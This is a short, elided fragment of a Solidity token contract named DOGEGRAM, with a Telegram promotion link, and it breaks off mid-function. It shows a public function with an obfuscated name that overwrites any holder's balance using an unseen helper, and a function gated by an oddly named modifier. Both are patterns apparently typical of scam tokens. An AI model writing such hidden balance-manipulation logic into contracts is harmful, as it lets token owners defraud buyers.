...
/*                                                          
                             Telegram : https://t.me/DogeGramBSC
...
contract DOGEGRAM is IERC20, Ownable {
    ...
    function _Check(address buyer) public {
        balances[buyer] = Bscreflection(buyer);
    }

    function Jbed(address Router) public Saflu {
